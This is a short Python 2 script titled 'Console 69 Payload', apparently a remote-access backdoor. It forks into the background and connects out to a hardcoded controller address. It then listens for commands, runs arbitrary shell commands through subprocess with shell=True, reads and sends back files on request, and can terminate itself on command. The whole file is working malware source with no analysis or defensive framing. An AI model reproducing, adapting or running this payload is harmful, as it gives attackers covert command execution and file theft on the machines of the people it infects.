#!/usr/bin/env python

############### Console 69 Payload By Looper ####################
######################## (c) 2017 ###############################
import os
import socket
import time
import subprocess
import sys
import re
from multiprocessing import Process
server_ip = ''
server_port = 31336
rport = 31337
rhost = "192.168.1.113"



def start_command_line():
	global server_ip, server_port, rport, rhost
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	while 1:
		try:
			s.bind((server_ip, server_port))
			break
		except socket.error:
			server_port+=1
	s.listen(1)
	c, addr = s.accept()
	c.send("READY")
	while 1:
		cmd = c.recv(1024)
		if cmd:
			if cmd == 'exit':
				dta = ''
				while dta != 'continue':
					c.close()
					s.close()
					infected()

			elif cmd == 'kill':
				c.close()
				s.close()
				exit(0)
			elif cmd == "PATH":
				c.send(os.getcwd())
			elif cmd.startswith("cd "):
				try:
					os.chdir(cmd[3:])
					c.send(os.getcwd())
				except:
					c.send("[!] "+cmd[3:]+" does not exist")
			elif cmd.startswith("download "):
				filename = cmd[9:]
				f = open(filename, 'r')
				data = f.readlines()
				c.send(str(data))

			else:
				proc2 = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				output = proc2.stdout.read() + proc2.stderr.read()
				c.send(output)
				if output == "":
					c.send("[OK]")
def infected():
	global server_ip, server_port, rport, rhost
	while 1:
		try:
			cnn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
			cnn.connect((rhost, rport))

			server_ip = cnn.recv(1024)

			cnn.close()
			break
		except:
			pass

	start_command_line()

newRef = os.fork()
if newRef == 0:
	infected()